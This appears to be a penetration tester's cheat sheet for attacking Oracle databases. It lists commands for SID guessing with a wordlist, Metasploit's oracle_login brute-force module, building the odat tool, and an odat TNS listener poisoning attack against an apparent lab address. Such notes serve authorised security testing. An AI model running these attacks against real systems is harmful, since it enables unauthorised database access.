# Oracle DBs

## Table of Contents

## sidguess

```
sidguess -i X.X.X.X -d ~/wordlist/alpha5
```

## oracle_login

```
msfconsole
use auxiliary/admin/oracle/oracle_login
set SID xe
set rhost X.X.X.X
exploit
```

## odat

* gitlab clone: `https://gitlab.com/nmatt0/odat`
* improved Dockerfile: XXX

```
sudo docker build -t odat .
sudo docker run -i -t odat
# TNSPOISON
sudo docker run -i -t -p1522:1522 odat
```

### TNSPOISON via odat

```
./odat.py  tnspoison   -s 10.10.10.82 -d xe --poison
```
